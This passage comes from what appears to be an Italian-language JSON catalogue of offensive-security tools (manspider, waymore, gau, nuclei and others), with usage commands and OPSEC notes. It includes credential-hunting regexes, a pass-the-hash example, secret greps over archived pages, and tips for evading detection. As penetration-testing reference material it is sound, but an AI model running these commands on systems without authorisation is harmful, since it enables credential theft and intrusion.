  {
    "id": "manspider",
    "name": "manspider",
    "version": "1.1.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/blacklanternsecurity/MANSPIDER",
    "desc": "Crawler SMB per cercare file sensibili nelle share di rete usando regex su nomi e contenuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MANSPIDER è uno strumento di ricognizione che esplora sistematicamente le share SMB di intere reti alla ricerca di file sensibili. Supporta la ricerca tramite regex sia nei nomi dei file che nei contenuti, con capacità di estrazione testo da PDF, DOCX, XLSX, PPTX e altri formati. Può usare autenticazione standard, NTLM hash o Kerberos, con fallback automatico a guest/null session.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Content Search:</strong> Cerca pattern regex all'interno dei documenti, non solo nei nomi file.</p><p><strong>Multi-Format:</strong> Estrae testo da PDF, Office, e formati text-based. OCR opzionale per immagini.</p><p><strong>Auth Chain:</strong> Prova credenziali fornite → guest → null session automaticamente.</p><p><strong>Loot Directory:</strong> Scarica automaticamente i file trovati in directory organizzate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Credential hunting - cerca file con password nei nomi\nmanspider 192.168.1.0/24 -f \"password|passwd|cred|secret\" \\\n  -u domain\\\\user -p 'P@ssw0rd' -t 5  # 5 thread (stealth)\n\n# Cerca CONTENUTO nei documenti (regex nel body)\nmanspider targets.txt -c \"API[_-]?KEY|aws_secret|AKIA[0-9A-Z]\" \\\n  -e pdf,docx,xlsx,txt,config,xml,json\n\n# Pass-the-Hash con NTLM (post-exploitation)\nmanspider 10.10.10.0/24 -f \"*.kdbx|*.key|id_rsa\" \\\n  -u administrator -H aad3b435b51404ee:8846f7eaee8fb117\n\n# Kerberos auth (con ticket già in cache)\nexport KRB5CCNAME=/tmp/krb5cc_user\nmanspider dc01.corp.local -f \"*.pfx|*.p12\" -k\n\n# Cerca solo in share specifiche (ignora IPC$, ADMIN$)\nmanspider 192.168.1.0/24 -f \"confidential\" \\\n  --sharenames \"Finance,HR,IT\" --exclude-sharenames \"SYSVOL\"\n\n# Download automatico in loot directory organizzata\nmanspider targets.txt -f \"*.kdbx|backup*|*.bak\" \\\n  -u user -p pass -o ./loot --max-filesize 50M\n\n# Post-exploitation: cerca connessioni DB\nmanspider dc01 -c \"connectionstring|Data Source=|Server=.*Password\" \\\n  -e config,xml,ini,json -d 5  # depth 5 directory</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Credential Hunting:</strong> Trova file con password, chiavi SSH, certificati, database KeePass e altri secret nelle share di rete.</li><li><strong>Data Discovery:</strong> Identifica documenti finanziari, config con connection string, API keys nelle share aziendali.</li><li><strong>Post-Exploitation:</strong> Dopo aver compromesso un account domain, esplora sistematicamente le share accessibili per privilege escalation.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> L'accesso massivo alle share genera log SMB significativi (Event ID 5140, 5145).</li><li><strong>Stealth:</strong> Usare <code>-t 1</code> per threading singolo in ambienti con SIEM/SOC attivo.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "uro",
    "name": "uro",
    "version": "1.0.2",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/s0md3v/uro",
    "desc": "Utility per filtrare e dedupare liste di URL rimuovendo duplicati, asset statici e contenuti ridondanti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Uro è un'utility Python per pulire e filtrare liste di URL prima del security testing. Rimuove intelligentemente URL ridondanti, duplicati, asset statici (immagini, JS, CSS), URL incrementali (/page/1/, /page/2/) e contenuti blog, tutto senza effettuare richieste HTTP. Opera completamente offline analizzando solo la struttura degli URL.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deduplication:</strong> Rimuove URL con stesso path ma valori parametri diversi.</p><p><strong>Extension Filter:</strong> Whitelist/blacklist per estensioni specifiche.</p><p><strong>Vuln Detection:</strong> Flag per identificare URL con parametri noti come vulnerabili.</p><p><strong>Content Filtering:</strong> Opzione per preservare o rimuovere contenuti blog-style.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Pipeline completa: gau -> uro -> nuclei\ngau target.com | uro | nuclei -t cves/\n\n# Solo URL con parametri (per injection testing)\ncat all_urls.txt | uro --filter hasparams > params_only.txt\n\n# Identifica URL con parametri potenzialmente vulnerabili\n# (id, file, path, url, redirect, etc.)\ncat urls.txt | uro --filter vuln | tee vuln_candidates.txt\n\n# Whitelist solo estensioni interessanti\ncat urls.txt | uro -w php,asp,aspx,jsp,json,xml > dynamic_urls.txt\n\n# Blacklist asset statici (immagini, font, etc.)\ncat urls.txt | uro -b png,jpg,gif,svg,woff,woff2,ttf,css\n\n# Workflow Bug Bounty completo\nwaybackurls target.com > raw_urls.txt\ngau target.com >> raw_urls.txt\ncat raw_urls.txt | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_ready.txt\n\n# Preserva contenuti blog (utile per scraping)\ncat urls.txt | uro --filter keepcontent\n\n# Rimuovi URL incrementali (/page/1, /page/2, /id/123)\ncat urls.txt | uro  # default behavior</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>URL Preprocessing:</strong> Essenziale per preparare liste URL da gau, waybackurls o waymore prima di passarle a scanner come nuclei o dalfox.</li><li><strong>Noise Reduction:</strong> Riduce drasticamente il noise (spesso 90%+) e il tempo di scansione eliminando duplicati e asset statici.</li><li><strong>Vulnerability Filtering:</strong> Identifica URL con parametri potenzialmente vulnerabili (id, file, path, url, redirect) per testing mirato.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento:</strong> Nessuno. Tool completamente offline che non genera traffico.</li><li><strong>Privacy:</strong> Opera solo su dati locali, nessuna comunicazione di rete.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "waymore",
    "name": "waymore",
    "version": "7.4",
    "icon": "../app/icons/github.svg",
    "installation": "pipx",
    "repo": "https://github.com/xnl-h4ck3r/waymore",
    "desc": "Recupera URL storici da Wayback Machine, Common Crawl, AlienVault OTX, URLScan, VirusTotal e IntelligenceX.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Waymore è uno strumento di ricognizione avanzato che supera waybackurls e gau aggregando URL archiviati da molteplici fonti storiche. Integra Wayback Machine, Common Crawl (250+ miliardi di pagine indicizzate), AlienVault OTX, URLScan.io, VirusTotal e IntelligenceX per massimizzare la copertura. La caratteristica distintiva è la capacità di scaricare le risposte archiviate complete (HTML, JS, JSON), non solo gli URL, permettendo analisi offline del contenuto storico per trovare secrets, API keys e credenziali rimosse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Interroga 6+ archivi in parallelo. Ogni fonte ha coverage diversa: Common Crawl eccelle per siti commerciali, Wayback per longevità storica, URLScan per siti recenti e malware analysis.</p><p><strong>Response Archive Download:</strong> Scarica il contenuto archiviato completo delle pagine. Fondamentale per trovare API keys, credenziali AWS/GCP hardcoded, token JWT, o endpoint in versioni precedenti del codice sorgente.</p><p><strong>Smart Filtering:</strong> Filtra per HTTP status code (es. solo 200), MIME type (application/json per API), keyword nel body, e date range. Riduce drasticamente il noise da migliaia a centinaia di URL rilevanti.</p><p><strong>Resume &amp; Rate Limit:</strong> Riprende download interrotti automaticamente. Gestisce i rate limit di ogni fonte (Wayback: 15 req/min, VirusTotal: API-dependent) senza intervento manuale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery completa (tutte le fonti abilitate)\nwaymore -i target.com -mode U -oU urls.txt\n\n# Scarica le RISPOSTE archiviate (gold mine per secrets!)\nwaymore -i target.com -mode R -oR ./responses/\n# Cerca secrets nelle risposte scaricate:\ngrep -rE \"api[_-]?key|password|secret|AKIA[0-9A-Z]{16}\" ./responses/\ntrufflehog filesystem ./responses/  # detection avanzata\n\n# Filtro temporale (cerca vecchie versioni pre-patch)\nwaymore -i target.com -mode U -from 2018 -to 2020 -oU old_endpoints.txt\n\n# Solo risposte JSON (scopri API endpoints storici)\nwaymore -i target.com -mode R -f \"application/json\" -oR ./api_responses/\njq -r 'keys[]' ./api_responses/*.json | sort -u  # estrai campi\n\n# Batch processing per programmi bug bounty\ncat scope_domains.txt | while read domain; do\n  waymore -i \"$domain\" -mode U -oU \"results/${domain}_urls.txt\"\ndone\ncat results/*_urls.txt | uro | anew all_scope_urls.txt\n\n# Cerca backup, config, admin panels storici\nwaymore -i target.com -mode U | \\\n  grep -iE \"backup|config|admin|debug|swagger|graphql\" | anew interesting.txt\n\n# Pipeline completa Bug Bounty\nwaymore -i target.com -mode U | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | httpx -silent | nuclei -t cves/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Secret Discovery:</strong> Le risposte archiviate spesso contengono API keys, credenziali AWS (AKIA...), token JWT, webhook URLs che sono stati successivamente rimossi dal codice live</li><li><strong>Legacy Endpoint Hunting:</strong> Trova endpoint deprecati ma ancora funzionanti (/api/v1/ quando il sito usa /api/v3/), admin panels dimenticati, debug endpoints</li><li><strong>Vulnerability Timeline:</strong> Confronta versioni storiche per identificare quando una vulnerabilità è stata introdotta o patchata (utile per responsible disclosure)</li><li><strong>OSINT Investigation:</strong> Ricostruisci la storia completa di un sito, identifica tecnologie precedenti, trova informazioni rimosse (contatti, partner, prezzi)</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target. Tutte le query sono verso archivi pubblici (Wayback, Common Crawl, etc.)</li><li><strong>API Keys Opzionali:</strong> VirusTotal e IntelligenceX richiedono API key per accesso completo. Configura in ~/.config/waymore/config.yml</li><li><strong>Storage Planning:</strong> Il mode R può scaricare GB di dati per target grandi. Usa -lr (limit responses) per controllare</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "anew",
    "name": "anew",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/anew",
    "desc": "Utility che appende linee a un file solo se non già presenti, con output simultaneo su stdout.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Anew è un'utility Go di tomnomnom che risolve un problema comune nei workflow di security testing: mantenere liste cumulative senza duplicati. Funziona come <code>tee -a</code> ma con deduplicazione integrata - appende linee da stdin a un file solo se non esistono già, scrivendo simultaneamente le nuove linee su stdout per permettere ulteriore piping. Questo pattern è fondamentale per costruire dataset incrementali in sessioni di recon multiple.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Deduplication:</strong> Confronta ogni linea in input con il contenuto esistente del file. Solo le linee nuove vengono appese, evitando duplicati anche su file di milioni di righe.</p><p><strong>Dual Output Stream:</strong> Le linee nuove vanno sia al file che a stdout. Questo permette pipeline come: <code>tool | anew file.txt | next_tool</code> dove next_tool processa solo i nuovi risultati.</p><p><strong>Dry-Run Mode:</strong> Flag <code>-d</code> mostra cosa verrebbe aggiunto senza modificare il file. Utile per preview prima di operazioni su file critici.</p><p><strong>Quiet Mode:</strong> Flag <code>-q</code> sopprime l'output stdout, utile quando vuoi solo aggiornare il file senza output a terminale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Workflow base: accumula subdomain da run multipli\nsubfinder -d target.com | anew subdomains.txt\namass enum -d target.com | anew subdomains.txt\nassetfinder target.com | anew subdomains.txt\n# subdomains.txt ora contiene l'unione senza duplicati\n\n# Pipeline: processa SOLO i nuovi subdomain trovati\nsubfinder -d target.com | anew subdomains.txt | httpx -silent | nuclei\n# httpx e nuclei vedono solo subdomain nuovi, non già processati\n\n# Continuous recon con notifica nuove scoperte\nwhile true; do\n  subfinder -d target.com -silent | anew subdomains.txt | \\\n    notify -silent -provider slack  # notifica solo nuovi\n  sleep 3600  # ogni ora\ndone\n\n# Dry-run per vedere differenze tra due scansioni\nsubfinder -d target.com | anew -d old_subdomains.txt\n# Mostra solo i subdomain nuovi rispetto alla scansione precedente\n\n# Merge file senza duplicati\ncat file1.txt file2.txt file3.txt | anew -q merged.txt\n\n# Accumula URL da tool multipli in parallelo\ngau target.com | anew urls.txt &amp;\nwaybackurls target.com | anew urls.txt &amp;\nwait\ncat urls.txt | uro > clean_urls.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Continuous Recon:</strong> Esegui scansioni periodiche accumulando risultati. Processa solo le nuove scoperte evitando lavoro duplicato</li><li><strong>Multi-Tool Aggregation:</strong> Combina output di subfinder, amass, assetfinder in un unico file deduplicato</li><li><strong>Delta Processing:</strong> In pipeline, passa ai tool successivi solo i risultati nuovi (es. scansiona con nuclei solo subdomain appena scoperti)</li><li><strong>Bug Bounty Monitoring:</strong> Integra con notify per alert su nuovi asset in scope</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Nessun Traffico:</strong> Tool puramente locale, opera solo su file e stdin/stdout</li><li><strong>Performance:</strong> Efficiente anche su file grandi grazie a map lookup O(1) in memoria</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "gau",
    "name": "gau",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/lc/gau",
    "desc": "Recupera URL noti da AlienVault OTX, Wayback Machine, Common Crawl e URLScan per un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GAU (GetAllUrls) è un'utility Go veloce e leggera che aggrega URL da 4 fonti storiche principali: Wayback Machine (archive.org), Common Crawl, AlienVault's Open Threat Exchange (OTX), e URLScan.io. A differenza di waybackurls (solo Wayback), gau combina multiple fonti per massimizzare la scoperta di endpoint storici, path legacy, e risorse non più linkate ma potenzialmente ancora accessibili. È uno dei tool più usati nella fase iniziale di bug bounty recon.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Parallel:</strong> Interroga tutte e 4 le fonti simultaneamente. Ogni fonte ha punti di forza diversi: OTX per threat intel, URLScan per siti recenti, Common Crawl per coverage commerciale.</p><p><strong>Smart Filtering:</strong> Blacklist per escludere estensioni inutili (png, jpg, css, woff), whitelist per includere solo estensioni interessanti, filtri per MIME type e status code HTTP.</p><p><strong>Fetch Parameters:</strong> Flag <code>--fp</code> rimuove URL con stesso path ma parametri diversi, riducendo drasticamente i duplicati mantenendo la varietà di endpoint.</p><p><strong>Date Range:</strong> Filtra per periodo temporale (<code>--from</code>, <code>--to</code>) per trovare URL di versioni specifiche del sito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery base per singolo dominio\ngau target.com --o urls.txt\n\n# Escludi asset statici (riduce noise ~80%)\ngau target.com --blacklist png,jpg,gif,svg,css,woff,woff2,ttf,ico\n\n# Solo estensioni interessanti per web testing\ngau target.com --whitelist php,asp,aspx,jsp,json,xml,js\n\n# Rimuovi URL con stesso path (deduplica parametri)\ngau target.com --fp | uro > unique_paths.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | gau --threads 5 --o all_urls.txt\n\n# Filtra per periodo (cerca versioni vulnerabili)\ngau target.com --from 2019 --to 2021 | grep -E \"api|admin\"\n\n# Output JSON per parsing programmatico\ngau target.com --json | jq -r '.url'\n\n# Pipeline completa: gau -> uro -> parametri -> nuclei\ngau target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u | nuclei -t fuzzing-templates/\n\n# Combina con waybackurls per coverage massima\n{ gau target.com; waybackurls target.com; } | sort -u | uro > combined.txt\n\n# Con provider specifici (config ~/.gau.toml)\ngau target.com --providers wayback,otx  # solo queste fonti</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Recon:</strong> Primo passo in bug bounty - mappa tutti gli endpoint storici prima di scansioni attive</li><li><strong>Legacy Endpoint Discovery:</strong> Trova /api/v1/ quando il sito usa /api/v3/, admin panels con path non standard, debug endpoints dimenticati</li><li><strong>Parameter Mining:</strong> Estrai nomi di parametri usati storicamente per costruire wordlist custom di fuzzing</li><li><strong>JavaScript Analysis:</strong> Filtra per .js per trovare file JS storici che potrebbero contenere endpoint hardcoded o secrets</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target. Query solo verso archivi pubblici</li><li><strong>Rate Limits:</strong> Le fonti hanno limiti (Wayback ~15 req/min). Gau li gestisce automaticamente</li><li><strong>API Keys:</strong> URLScan e OTX funzionano meglio con API key in ~/.gau.toml</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "jaeles",
    "name": "jaeles",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/jaeles-project/jaeles",
    "desc": "Framework per web security scanning basato su signature YAML customizzabili per vulnerability detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Jaeles è un framework Go per costruire scanner di sicurezza web personalizzati basati su signature YAML. A differenza di nuclei che ha template pre-definiti, Jaeles eccelle nella creazione di detection logic custom grazie al suo linguaggio di signature espressivo. Supporta detection di XSS, SQLi, LFI, SSRF, misconfigurations e CVE specifiche. Descritto come \"Swiss Army knife for automated Web Application Testing\", gestisce fino a 100+ richieste concorrenti con retry automatico e rate limiting intelligente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Expressive Signatures:</strong> Linguaggio YAML potente con variabili, condizioni, regex matching, e response analysis. Permette detection logic complessa impossibile con altri scanner.</p><p><strong>Signature Levels:</strong> Tre livelli di aggressività (L1=safe, L2=medium, L3=aggressive). Permette di controllare il rischio di triggering WAF o causare problemi.</p><p><strong>Passive &amp; Active:</strong> Supporta sia analisi passiva di response già catturate che testing attivo con payload injection.</p><p><strong>Rich Reporting:</strong> Output in JSON, HTML con screenshot, Markdown. Integrazione con Burp Suite tramite plugin dedicato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download signature ufficiali (primo utilizzo)\njaeles config init\n\n# Scan base con tutte le signature\njaeles scan -s ~/.jaeles/base-signatures/ -u https://target.com/\n\n# Solo signature CVE critiche\njaeles scan -s cves/ -u https://target.com -L 1 --no-background\n\n# Batch scan da lista URL con output HTML\ncat urls.txt | jaeles scan -s passives/ -o ./results --html\n\n# Scan parametri per injection (SQLi, XSS)\njaeles scan -s sqli,xss -U params_urls.txt -c 50 --verbose\n\n# Con header custom (auth required)\njaeles scan -s all -u https://target.com \\\n  -H \"Authorization: Bearer eyJ...\" \\\n  -H \"Cookie: session=abc123\"\n\n# Pipeline: gau -> filtra params -> jaeles\ngau target.com | uro --filter hasparams | \\\n  jaeles scan -s sqli,ssrf -c 30 -o findings/\n\n# Signature custom per la tua organizzazione\njaeles scan -s /path/to/custom-signatures/ -U targets.txt\n\n# Solo passive analysis (no active requests)\njaeles scan -s passives/ --passive -U urls.txt\n\n# Con proxy per debug/logging in Burp\njaeles scan -s all -u https://target.com --proxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Custom Vulnerability Detection:</strong> Crea signature specifiche per vulnerabilità della tua organizzazione o CVE non ancora coperte da altri scanner</li><li><strong>Regression Testing:</strong> Verifica che vulnerabilità fixate non riappaiano in nuove release</li><li><strong>CI/CD Security Gate:</strong> Integra in pipeline DevSecOps per bloccare deploy con vulnerabilità note</li><li><strong>Bug Bounty Automation:</strong> Scansiona automaticamente nuovi endpoint scoperti durante recon</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffico Attivo:</strong> Genera richieste HTTP con payload potenzialmente malevoli (SQLi, XSS payloads)</li><li><strong>WAF Detection:</strong> Signature aggressive (L3) possono triggare WAF. Usa L1 per engagement stealth</li><li><strong>Rate Limiting:</strong> Configura <code>-c</code> (concurrency) e <code>--delay</code> per evitare ban</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackurls",
    "name": "waybackurls",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/waybackurls",
    "desc": "Recupera tutti gli URL archiviati dalla Wayback Machine per un dominio e i suoi subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Waybackurls è un'utility Go di tomnomnom che interroga la Wayback Machine (archive.org) per recuperare tutti gli URL storici archiviati per un dominio. A differenza di gau che usa multiple fonti, waybackurls si concentra esclusivamente su Wayback Machine, risultando più veloce e leggero per query singole. Recupera automaticamente URL per tutti i subdomain archiviati del dominio target, rendendolo ideale come primo passo nella recon passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Subdomain Coverage:</strong> Recupera URL non solo per target.com ma anche per tutti i subdomain storicamente archiviati (api.target.com, staging.target.com, etc.).</p><p><strong>High Performance:</strong> Implementazione Go compilata, significativamente più veloce degli script Python equivalenti. Gestisce domini con milioni di URL archiviati.</p><p><strong>Pipeline Native:</strong> Accetta domini da stdin e output su stdout, perfetto per integrazione in workflow bash complessi.</p><p><strong>No Dependencies:</strong> Single binary senza dipendenze esterne, facilmente deployabile su qualsiasi sistema.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery per singolo dominio\nwaybackurls target.com > all_urls.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | waybackurls > all_historical_urls.txt\n\n# Filtra per endpoint interessanti\nwaybackurls target.com | grep -E \"api|admin|backup|config|debug\" > interesting.txt\n\n# Pipeline: waybackurls -> deduplica -> filtra params -> test\nwaybackurls target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_targets.txt\n\n# Cerca file JavaScript storici (secret hunting)\nwaybackurls target.com | grep \"\\.js$\" | sort -u > js_files.txt\nhttpx -silent -l js_files.txt -mc 200 | \\\n  xargs -I {} bash -c 'curl -s {} | js-beautify' | \\\n  grep -iE \"api_key|secret|password|token\"\n\n# Combina con gau per coverage massima\n{ waybackurls target.com; gau target.com; } | sort -u | uro > combined.txt\n\n# Trova backup files dimenticati\nwaybackurls target.com | grep -iE \"\\.(bak|backup|old|sql|zip|tar|gz)$\"\n\n# Con timestamps (per analisi temporale)\nwaybackurls -dates target.com | sort -t '/' -k1 > urls_with_dates.txt\n\n# Continuous monitoring\nwhile true; do\n  waybackurls target.com | anew urls.txt | notify -provider slack\n  sleep 86400  # daily check\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Passive Recon:</strong> Primo tool da lanciare - zero traffico verso target, scopre attack surface storica</li><li><strong>Legacy Endpoint Discovery:</strong> Trova versioni API deprecate (/api/v1/), admin panels con path non standard, staging environments</li><li><strong>Secret Hunting:</strong> File JS storici spesso contengono API keys, endpoint interni, credenziali hardcoded poi rimosse</li><li><strong>Backup File Discovery:</strong> Trova .bak, .sql, .zip archiviati e potenzialmente ancora accessibili sul server live</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>100% Passivo:</strong> Nessun traffico verso il target. Tutte le query vanno a web.archive.org</li><li><strong>Rate Limit:</strong> Wayback ha limiti (~15 req/min). Per domini grandi, considera waymore che gestisce meglio i limiti</li><li><strong>Coverage:</strong> Solo Wayback Machine. Per coverage completa, combina con gau o waymore</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-nuclei",
    "name": "nuclei",
    "version": "latest",
    "icon": "../app/icons/nuclei-logo.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/nuclei",
    "desc": "Scanner di vulnerabilità basato su template YAML con supporto multi-protocollo e community-driven.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Nuclei è lo scanner di vulnerabilità open-source più potente e versatile disponibile, costruito su un ecosistema di template YAML contribuiti da migliaia di security professional in tutto il mondo. A differenza degli scanner tradizionali che si basano su signature proprietarie, Nuclei permette a chiunque di creare, condividere e personalizzare detection logic per qualsiasi tipo di vulnerabilità, misconfiguration o esposizione. Supporta scansioni via TCP, DNS, HTTP, SSL, WHOIS, JavaScript, Headless browser, Code execution e Websocket, rendendolo applicabile a praticamente qualsiasi scenario di security testing.</p><p>L'architettura è ottimizzata per velocità: il request clustering riduce drasticamente il numero di connessioni, la gestione intelligente del rate limiting previene blocchi, e il parallelismo configurabile permette di scansionare migliaia di host in minuti. La community maintiene oltre 8000 template pubblici che coprono CVE recenti, misconfiguration comuni, exposed panels, default credentials e vulnerability class specifiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template-Based Architecture:</strong> Ogni controllo è definito in un file YAML human-readable. Questo permette audit del comportamento, customizzazione immediata e contribuzione community. I template supportano matchers regex, status code, word matching e DSL expressions per logica complessa.</p><p><strong>Multi-Protocol Support:</strong> HTTP/HTTPS con supporto full request customization, DNS per record enumeration e zone transfer detection, TCP/UDP raw per servizi custom, SSL/TLS per certificate analysis e cipher suite testing, File per local vulnerability scanning, Code per execution-based detection, Headless per JavaScript-rendered content e authentication flows.</p><p><strong>Workflow &amp; Automation:</strong> I workflow permettono di concatenare template in sequenze logiche (es. prima identifica CMS, poi lancia template specifici). Le variabili condivise permettono di passare dati tra step (es. token CSRF estratto usato in request successive).</p><p><strong>Enterprise Features:</strong> Integrazione nativa con Jira, Splunk, GitHub Issues, Elastic, GitLab, Slack, Discord, Telegram. Supporto per scan scheduling, reporting avanzato e team collaboration tramite ProjectDiscovery Cloud.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo target con tutti i template (non raccomandato su target prod)\nnuclei -u https://target.com\n\n# Scan con severity filter - solo critical e high (raccomandato per primo assessment)\nnuclei -u https://target.com -severity critical,high\n\n# === SCANSIONI MIRATE ===\n# Solo CVE degli ultimi 2 anni con rate limiting (evita WAF blocks)\nnuclei -u https://target.com -t cves/ -rl 50 -c 5 \\\n  -tags cve2024,cve2025 -o cve_results.txt\n\n# Template specifici per CMS detection + exploitation\nnuclei -u https://target.com -t technologies/ -t cves/wordpress/ \\\n  -t cves/joomla/ -t cves/drupal/ -json -o cms_vulns.json\n\n# === SCANSIONI MASSIVE ===\n# Batch scan da output di subfinder/httpx\nsubfinder -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t misconfiguration/ -t cves/ \\\n  -severity medium,high,critical -c 50 -rl 100 -o findings.txt\n\n# Scan con resume (riprende se interrotto)\nnuclei -l 10k_urls.txt -t cves/ -resume\n\n# === TEMPLATE PERSONALIZZATI ===\n# Esegui template custom + community\nnuclei -u https://target.com -t ~/my-templates/ -t cves/ -validate\n\n# Cerca template per keyword\nnuclei -tl | grep -i \"wordpress\"\n\n# === OUTPUT &amp; REPORTING ===\n# Output multipli formati per reporting\nnuclei -l urls.txt -t cves/ -severity critical,high \\\n  -json -o detailed.json \\\n  -me markdown_export/ \\\n  -sarif sarif_report.sarif\n\n# === INTEGRAZIONE CI/CD ===\n# GitHub Actions compatible - exit 1 se critical found\nnuclei -l urls.txt -t cves/ -severity critical -silent -nc || exit 1\n\n# === SCANSIONI SPECIFICHE ===\n# Exposed panels e takeover\nnuclei -l subdomains.txt -t takeovers/ -t exposed-panels/ -c 100\n\n# Default credentials check\nnuclei -l urls.txt -t default-logins/ -rl 5 -c 2\n\n# SSL/TLS misconfiguration\nnuclei -l hosts.txt -t ssl/ -t misconfiguration/tls/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Vulnerability Assessment continuo:</strong> Integrato in pipeline CI/CD per scansione automatica ad ogni deploy, catch vulnerabilità prima che raggiungano produzione.</li><li><strong>Bug Bounty hunting:</strong> Template community coprono le vulnerability class più remunerative (SSRF, RCE, Auth bypass). La velocità permette di testare scope enormi rapidamente.</li><li><strong>Compliance e Audit:</strong> Template per verifica configurazioni SSL/TLS, security header, exposed services. Report esportabili per documentazione audit.</li><li><strong>Threat Detection:</strong> Template per webshell detection, malware indicators, compromission signs su infrastruttura già violata.</li><li><strong>Red Team reconnaissance:</strong> Identificazione rapida di entry point prima di exploitation manuale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Fingerprinting:</strong> User-Agent default \"Nuclei\" è facilmente riconoscibile. Usa <code>-H \"User-Agent: Mozilla/5.0...\"</code> per blending.</li><li><strong>Payload detection:</strong> Molti template inviano payload attivi (SQLi, XSS, RCE attempts). WAF/IDS triggereranno alert.</li><li><strong>Rate limiting:</strong> Senza <code>-rl</code> e <code>-c</code> appropriati, il volume di richieste può causare blocchi o DoS involontari.</li><li><strong>Log forensics:</strong> Ogni richiesta Nuclei è loggata server-side. Template custom con identificatori unici sono tracciabili.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
